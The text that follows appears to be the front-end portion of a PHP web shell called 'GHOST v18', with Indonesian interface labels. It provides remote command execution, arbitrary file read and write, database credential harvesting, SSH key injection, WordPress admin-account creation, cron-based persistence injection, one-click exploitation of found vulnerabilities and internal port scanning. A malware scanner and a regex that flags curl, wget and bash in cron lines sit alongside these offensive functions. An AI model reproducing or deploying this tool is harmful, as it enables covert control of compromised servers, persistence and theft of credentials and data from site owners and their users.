    .tabs { display:flex; gap:4px; margin-bottom:12px; border-bottom:1px solid var(--border); padding-bottom:8px; }
    .tab-btn { background:transparent; border:1px solid transparent; color:#888; padding:8px 16px; cursor:pointer; }
    .tab-btn:hover { color:#fff; }
    .tab-btn.active { background:#111; border-color:var(--border); border-bottom-color:var(--bg); color:var(--fg); border-radius:4px 4px 0 0; }
    .tab-content { display:none; }
    .tab-content.active { display:block; }
</style>
</head>
<body>
<div class="box">
    <h2>GHOST v18 / Final Build</h2>
    <div class="row">
        <span class="tag"><?= htmlspecialchars($env['php_version']) ?></span>
        <span class="tag"><?= htmlspecialchars($env['user']) ?></span>
        <span class="tag <?= $env['can']['exec']?'tag-ok':'tag-no' ?>">exec: <?= $env['can']['exec']?:'BLOCKED' ?></span>
    </div>
</div>

<div class="tabs">
    <button class="tab-btn active" id="btn-tab-term" onclick="switchTab('tab-term', this)">Terminal</button>
    <button class="tab-btn" id="btn-tab-scan" onclick="switchTab('tab-scan', this)">Deep Scanner</button>
    <button class="tab-btn" id="btn-tab-vuln" onclick="switchTab('tab-vuln', this)">Vulnerability</button>
    <button class="tab-btn" id="btn-tab-db-ssh" onclick="switchTab('tab-db-ssh', this)">DB & SSH</button>
    <button class="tab-btn" id="btn-tab-wp" onclick="switchTab('tab-wp', this)">WP Manager</button>
    <button class="tab-btn" id="btn-tab-cron" onclick="switchTab('tab-cron', this)">Persistence (CRON)</button>
    <button class="tab-btn" id="btn-tab-profile" onclick="switchTab('tab-profile', this)">Profile & Port</button>
</div>

<!-- TAB: TERMINAL -->
<div id="tab-term" class="tab-content active">
    <div class="box">
        <div id="term"><div class="term-line"><span class="dim">Welcome.</span></div></div>
        <div class="row" style="margin-top:8px;">
            <input type="text" id="cmd" placeholder="whoami" style="flex:1;">
            <button id="btn-exec">Exec</button>
        </div>
    </div>
    <div class="box">
        <h2>File Manager</h2>
        <div class="row">
            <input type="text" id="f-path" placeholder="/path/to/file" style="flex:1;">
            <button id="btn-read">Read</button>
            <button id="btn-write" style="border-color:#ff0;color:#ff0;">Write</button>
        </div>
        <pre id="f-out" style="margin-top:8px;">Ready.</pre>
    </div>
</div>

<!-- TAB: DEEP SCANNER -->
<div id="tab-scan" class="tab-content">
    <div class="box">
        <h2>Heuristic File Scanner</h2>
        <div class="row">
            <button id="btn-scan">Start Scan</button>
            <span id="scan-status" class="dim">Idle.</span>
        </div>
        <div id="scan-results"></div>
    </div>
</div>

<!-- TAB: VULNERABILITY -->
<div id="tab-vuln" class="tab-content">
    <div class="box">
        <h2>Vulnerability Explorer</h2>
        <div class="row"><button id="btn-vuln">Scan Vulnerabilities</button></div>
        <div id="vuln-results"></div>
    </div>
</div>

<!-- TAB: DB & SSH -->
<div id="tab-db-ssh" class="tab-content">
    <div class="grid">
        <div class="box">
            <h2>DB Harvester</h2>
            <div class="row"><button id="btn-db">Scan & Connect</button></div>
            <pre id="db-out" style="margin-top:8px;">Ready.</pre>
        </div>
        <div class="box">
            <h2>SSH Manager (Attribution)</h2>
            <div class="row"><button id="btn-ssh">Scan SSH</button></div>
            <div id="ssh-out" style="margin-top:8px; max-height:300px; overflow:auto;"></div>
            <div class="row" style="margin-top:8px;">
                <input type="text" id="ssh-key" placeholder="ssh-rsa AAAA..." style="flex:1;">
                <button id="btn-ssh-inject">Inject</button>
                <button id="btn-ssh-clean" style="border-color:#f00;color:#f00;">Clean</button>
            </div>
        </div>
    </div>
</div>

<!-- TAB: WP MANAGER -->
<div id="tab-wp" class="tab-content">
    <div class="box">
        <h2>WordPress User Manager</h2>
        <div class="row"><button id="btn-wp-scan">Scan WP Users</button></div>
        <div id="wp-results" style="margin-top:8px;"></div>
        <div class="row" style="margin-top:8px; border-top:1px solid #333; padding-top:8px;">
            <input type="text" id="wp-user" placeholder="Username">
            <input type="text" id="wp-pass" placeholder="Password">
            <input type="text" id="wp-email" placeholder="Email">
            <button onclick="wpAct('create')" style="border-color:#0f0;color:#0f0;">Add User</button>
            <button onclick="wpAct('delete')" style="border-color:#f00;color:#f00;">Delete User</button>
        </div>
        <pre id="wp-log" style="margin-top:8px;">Ready.</pre>
    </div>
</div>

<!-- TAB: PERSISTENCE (CRON) -->
<div id="tab-cron" class="tab-content">
    <div class="box">
        <h2>Persistence (CRON)</h2>
        <div class="row"><button id="btn-cron-scan">Scan Cron Jobs</button></div>
        <div id="cron-results" style="margin-top:8px;"></div>
        <div class="row" style="margin-top:8px; border-top:1px solid #333; padding-top:8px;">
            <input type="text" id="cron-content" placeholder="* * * * * /bin/bash -c '...'" style="flex:1;">
            <button onclick="cronAct('inject')" style="border-color:#0f0;color:#0f0;">Inject Cron</button>
        </div>
        <pre id="cron-log" style="margin-top:8px;">Ready.</pre>
    </div>
</div>

<!-- TAB: PROFILE & PORT -->
<div id="tab-profile" class="tab-content">
    <div class="grid">
        <div class="box">
            <h2>Target Profiler & CVE</h2>
            <div class="row"><button id="btn-cve">Analyze Stack & CVE</button></div>
            <div id="cve-out" style="margin-top:8px;">Ready.</div>
        </div>
        <div class="box">
            <h2>Internal Port Scanner</h2>
            <div class="row">
                <input type="text" id="port-target" value="127.0.0.1" style="flex:1;">
                <button id="btn-port">Scan Ports</button>
            </div>
            <pre id="port-out" style="margin-top:8px;">Ready.</pre>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('btn-exec').onclick = execCmd;
    document.getElementById('cmd').onkeydown = e => { if(e.key==='Enter') execCmd(); };
    document.getElementById('btn-read').onclick = readFile;
    document.getElementById('btn-write').onclick = writeFile;
    document.getElementById('btn-scan').onclick = startScan;
    document.getElementById('btn-vuln').onclick = vulnScan;
    document.getElementById('btn-db').onclick = dbHarvest;
    document.getElementById('btn-ssh').onclick = sshScan;
    document.getElementById('btn-ssh-inject').onclick = () => sshAct('inject');
    document.getElementById('btn-ssh-clean').onclick = () => sshAct('clean');
    document.getElementById('btn-cve').onclick = cveProfile;
    document.getElementById('btn-port').onclick = portScan;
    document.getElementById('btn-wp-scan').onclick = wpScan;
    document.getElementById('btn-cron-scan').onclick = cronScan;
});

function switchTab(id, btn) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    btn.classList.add('active');
}

function esc(s){ 
    if(s === null || s === undefined) return '';
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); 
}

async function api(act, data={}) {
    const body = new URLSearchParams(); body.append('act', act);
    for (let k in data) body.append(k, data[k]);
    const r = await fetch(window.location.href, { method:'POST', body });
    const text = await r.text();
    try { return JSON.parse(text); } catch(e) { return {err:'RAW ERROR ('+r.status+'):\n'+text.substring(0,500)}; }
}

async function execCmd() {
    const cmd = document.getElementById('cmd').value.trim(); if(!cmd) return;
    document.getElementById('cmd').value = '';
    const t = document.getElementById('term');
    const line = document.createElement('div'); line.className = 'term-line';
    line.innerHTML = `<span class="term-in">$</span><span class="term-out">${esc(cmd)}</span>`;
    t.appendChild(line); t.scrollTop = t.scrollHeight;
    const resp = await api('exec', {cmd});
    const outLine = document.createElement('div'); outLine.className = 'term-line';
    if(resp.err) outLine.innerHTML = `<span class="err">[${esc(resp.tier||'ERR')}] Error: ${esc(resp.err)}</span>`;
    else outLine.innerHTML = `<span class="dim">[${esc(resp.tier)}]</span><span class="term-out">${esc(resp.out||'(no output)')}</span>`;
    t.appendChild(outLine); t.scrollTop = t.scrollHeight;
}

async function readFile() {
    const p = document.getElementById('f-path').value.trim(); const o = document.getElementById('f-out');
    if(!p) return o.innerText = 'Path?'; o.innerText = 'Reading...';
    const resp = await api('read', {path:p});
    o.innerText = resp.err ? 'Error: '+resp.err : (resp.content || '(empty)');
}
async function writeFile() {
    const p = document.getElementById('f-path').value.trim(); if(!p) return alert('Path?');
    const data = prompt('Isi konten:'); if(data === null) return;
    const o = document.getElementById('f-out'); o.innerText = 'Writing...';
    const resp = await api('write', {path:p, data:data});
    o.innerText = resp.ok ? 'Success.' : 'Error.';
}

async function startScan() {
    let offset = 0; let mal = [];
    const resDiv = document.getElementById('scan-results'); resDiv.innerHTML = '';
    const statDiv = document.getElementById('scan-status'); statDiv.innerText = 'Scanning...';
    while (true) {
        statDiv.innerText = `Analyzing batch offset ${offset}...`;
        const d = await api('scan', {offset: offset});
        if (d.err) { statDiv.innerText = 'Error: ' + d.err; break; }
        d.files.forEach(f => mal.push(f));
        if (d.done) { statDiv.innerText = `Done! ${mal.length} files flagged from ${d.total}.`; renderScan(mal); break; }
        offset += 50;
    }
}

// GROUPING LOGIC
function renderScan(mal) {
    if (!mal.length) { document.getElementById('scan-results').innerHTML = '<p class="dim">Clean.</p>'; return; }
    
    let groups = {
        'Backdoor / Malware (Merah)': [],
        'Sampah / Leftover (Biru)': [],
        'Suspicious / Curiga (Orange)': [],
        'Illegal Content / Judi (Ungu)': []
    };

    mal.forEach(x => {
        if (x.type.includes('Suspicious')) {
            groups['Suspicious / Curiga (Orange)'].push(x);
        } else if (x.type.includes('Leftover') || x.type.includes('Empty Shell')) {
            groups['Sampah / Leftover (Biru)'].push(x);
        } else if (x.type.includes('Illegal') || x.type.includes('Judi') || x.type.includes('Porno')) {
            groups['Illegal Content / Judi (Ungu)'].push(x);
        } else {
            groups['Backdoor / Malware (Merah)'].push(x);
        }
    });

    let html = '';
    for (let gName in groups) {
        let items = groups[gName];
        if (!items.length) continue;

        let color = '#d9534f'; // Red default
        if (gName.includes('Orange')) color = '#f0ad4e';
        if (gName.includes('Biru')) color = '#5bc0de';
        if (gName.includes('Ungu')) color = '#800080';

        html += `<div class="box" style="border-left: 4px solid ${color}; margin-top:16px;">`;
        html += `<h3 style="color:${color};font-size:12px;">${gName} (${items.length} File)</h3>`;
        html += `<table><tr><th>Type & Desc</th><th>File</th><th>Aksi</th></tr>`;
        
        items.forEach(x => {
            let enc = encodeURIComponent(x.path);
            html += `<tr>
                <td><span class="badge" style="background:${color}">${esc(x.type)}</span><br><span class="dim" style="font-size:11px;">${esc(x.desc)}</span></td>
                <td>${esc(x.path)}</td>
                <td>
                    <button onclick="viewFileScan('${enc}')" style="border-color:#0f0;color:#0f0; padding:2px 5px; font-size:11px;">View</button>
                    <button onclick="delFileScan('${enc}')" style="border-color:#f00;color:#f00; padding:2px 5px; font-size:11px;">Del</button>
                </td>
            </tr>`;
        });
        html += `</table></div>`;
    }
    
    document.getElementById('scan-results').innerHTML = html;
}

function viewFileScan(enc) {
    const p = decodeURIComponent(enc);
    document.getElementById('f-path').value = p;
    switchTab('tab-term', document.getElementById('btn-tab-term'));
    readFile();
}
async function delFileScan(enc) {
    const p = decodeURIComponent(enc);
    if(!confirm('Hapus file ' + p + '?')) return;
    await api('delete', {path:p});
    startScan(); // refresh
}

async function dbHarvest() {
    const o = document.getElementById('db-out'); o.innerText = 'Running The Absolute DB Hijacker (40 Phases x 5 Iterations)... Please wait, ini bisa memakan waktu.';
    const d = await api('db_harvest');
    if (d.err) return o.innerText = d.err;
    o.innerText = d.logs.join('\n');
}

async function sshScan() {
    const o = document.getElementById('ssh-out'); o.innerText = 'Scanning...';
    const d = await api('ssh_scan');
    if (d.err) return o.innerText = d.err;
    
    let txt = '<pre>' + d.logs.join('\n') + '</pre>';
    if (d.keys.length) {
        txt += `<h3 style="margin-top:15px;font-size:12px;">SSH Authorized Keys</h3>`;
        txt += `<table style="width:100%;border-collapse:collapse;margin-top:5px;font-size:11px;">`;
        txt += `<tr style="background:#111;"><th>File</th><th>Key Preview</th><th>Status</th><th>Action</th></tr>`;
        d.keys.forEach((k, i) => {
            let preview = k.key.substring(0, 30) + '...';
            let encKey = encodeURIComponent(k.key);
            let badge = k.suspicious ? '<span class="badge" style="background:#f00;color:#fff;">SUSPICIOUS</span>' : '<span class="badge" style="background:#0f0;color:#000;">LEGIT</span>';
            txt += `<tr>
                <td>${esc(k.file)}</td>
                <td>${esc(preview)}</td>
                <td>${badge} ${esc(k.comment)}</td>
                <td><button onclick="removeSshKey('${encKey}')" style="border-color:#f00;color:#f00;padding:2px 8px;font-size:11px;">Remove</button></td>
            </tr>`;
        });
        txt += `</table>`;
    }
    o.innerHTML = txt;
}

async function removeSshKey(encKey) {
    const k = decodeURIComponent(encKey);
    if(!confirm('Hapus key ini dari authorized_keys?')) return;
    const d = await api('ssh_action', {action: 'clean', key: k});
    alert(d.msg || d.err);
    sshScan();
}

async function sshAct(act) {
    const k = document.getElementById('ssh-key').value;
    if(!k) return alert('Isi key dulu!');
    const d = await api('ssh_action', {action: act, key: k});
    alert(d.msg || d.err);
    sshScan();
}

async function wpScan() {
    const resDiv = document.getElementById('wp-results'); resDiv.innerHTML = 'Scanning WP Users...';
    const d = await api('wp_scan');
    if (d.err) { resDiv.innerHTML = '<span class="err">'+d.err+'</span>'; return; }
    if (!d.users.length) { resDiv.innerHTML = '<p class="dim">Tidak ada user ditemukan atau bukan WordPress.</p>'; return; }
    
    let h = `<table><tr><th>ID</th><th>Username</th><th>Email</th><th>Role</th></tr>`;
    d.users.forEach(u => {
        h += `<tr><td>${esc(u.id)}</td><td>${esc(u.login)}</td><td>${esc(u.email)}</td><td>${esc(u.role)}</td></tr>`;
    });
    h += `</table>`;
    resDiv.innerHTML = h;
}

async function wpAct(act) {
    const u = document.getElementById('wp-user').value.trim();
    const p = document.getElementById('wp-pass').value.trim();
    const e = document.getElementById('wp-email').value.trim();
    const o = document.getElementById('wp-log');
    
    if (!u) return alert('Username harus diisi!');
    o.innerText = 'Processing...';
    const d = await api('wp_action', {action: act, user: u, pass: p, email: e});
    if (d.err) return o.innerText = 'Error: ' + d.err;
    o.innerText = d.msg || 'Success.';
    wpScan();
}

async function cronScan() {
    const resDiv = document.getElementById('cron-results'); resDiv.innerHTML = 'Scanning Cron Jobs...';
    const d = await api('cron_scan');
    if (d.err) { resDiv.innerHTML = '<span class="err">'+d.err+'</span>'; return; }
    if (!d.crons.length) { resDiv.innerHTML = '<p class="dim">Tidak ada cron ditemukan.</p>'; return; }
    
    let h = `<table><tr><th>File</th><th>Content</th><th>Action</th></tr>`;
    d.crons.forEach(c => {
        let lines = c.content.split('\n');
        lines.forEach(line => {
            if (!line.trim() || line.trim().startsWith('#')) return;
            let encLine = encodeURIComponent(line.trim());
            let encFile = encodeURIComponent(c.file);
            let isSus = /curl|wget|bash|sh|python|perl/i.test(line);
            let badge = isSus ? '<span class="badge" style="background:#f00;color:#fff;">SUSPICIOUS</span>' : '';
            h += `<tr>
                <td>${esc(c.file)}</td>
                <td><code>${esc(line.trim())}</code> ${badge}</td>
                <td><button onclick="cronAct('delete', '${encFile}', '${encLine}')" style="border-color:#f00;color:#f00;padding:2px 8px;font-size:11px;">Delete</button></td>
            </tr>`;
        });
    });
    h += `</table>`;
    resDiv.innerHTML = h;
}

async function cronAct(action, encFile, encLine) {
    const o = document.getElementById('cron-log');
    if (action === 'delete') {
        if (!confirm('Hapus baris cron ini?')) return;
        const file = encFile ? decodeURIComponent(encFile) : '';
        const line = encLine ? decodeURIComponent(encLine) : '';
        o.innerText = 'Processing...';
        const d = await api('cron_action', {action: 'delete', file: file, line: line});
        o.innerText = d.msg || d.err;
        cronScan();
    } else if (action === 'inject') {
        const content = document.getElementById('cron-content').value.trim();
        if (!content) return alert('Isi cron dulu!');
        o.innerText = 'Processing...';
        const d = await api('cron_action', {action: 'inject', content: content});
        o.innerText = d.msg || d.err;
        document.getElementById('cron-content').value = '';
        cronScan();
    }
}

async function vulnScan() {
    const resDiv = document.getElementById('vuln-results'); resDiv.innerHTML = 'Scanning...';
    const d = await api('vuln_scan');
    if (d.err) { resDiv.innerHTML = '<span class="err">'+d.err+'</span>'; return; }
    if (!d.length) { resDiv.innerHTML = '<p class="dim">No vulnerabilities found.</p>'; return; }
    let h = `<table><tr><th>Type</th><th>Path</th><th>Desc</th><th>Aksi</th></tr>`;
    d.forEach(v => {
        h += `<tr><td><span class="badge">${esc(v.type)}</span></td><td>${esc(v.path)}</td><td>${esc(v.desc)}</td>
              <td><button onclick="exploit('${esc(v.type)}', '${encodeURIComponent(v.path)}')" style="border-color:#f00;color:#f00;">Exploit</button></td></tr>`;
    });
    h += `</table>`; resDiv.innerHTML = h;
}
async function exploit(t, encP) {
    if(!confirm('Jalankan exploit untuk celah ini?')) return;
    const p = decodeURIComponent(encP);
    const d = await api('exploit', {type: t, path: p});
    alert(d.msg || d.err);
}

async function portScan() {
    const t = document.getElementById('port-target').value.trim(); const o = document.getElementById('port-out');
    o.innerText = 'Scanning ports on ' + t + ' via Bash/Exec...';
    const d = await api('port_scan', {target: t});
    if (d.err) return o.innerText = d.err;
    if (!d.length) return o.innerText = 'No open ports found.';
    let txt = '--- OPEN PORTS ---\n';
    d.forEach(p => txt += `[+] ${p.port}/tcp\n`);
    o.innerText = txt;
}

async function cveProfile() {
    const o = document.getElementById('cve-out'); o.innerText = 'Analyzing...';
    const d = await api('cve_profile');
    if (d.err) return o.innerText = d.err;
    let txt = '<h3>Stack:</h3><ul>';
    d.stack.forEach(s => txt += `<li>${esc(s)}</li>`);
    txt += '</ul><h3>CVE:</h3>';
    if (d.cves.length) {
        txt += '<ul style="color:#f00;">';
        d.cves.forEach(c => txt += `<li>${esc(c)}</li>`);
        txt += '</ul>';
    } else { txt += '<p class="dim">Tidak ada CVE kritis yang cocok.</p>'; }
    o.innerHTML = txt;
}
</script>
</body>
</html>
    <?php
}
if (!defined('GH_ENTRY_DONE')) { define('GH_ENTRY_DONE', true); gh_router(); }
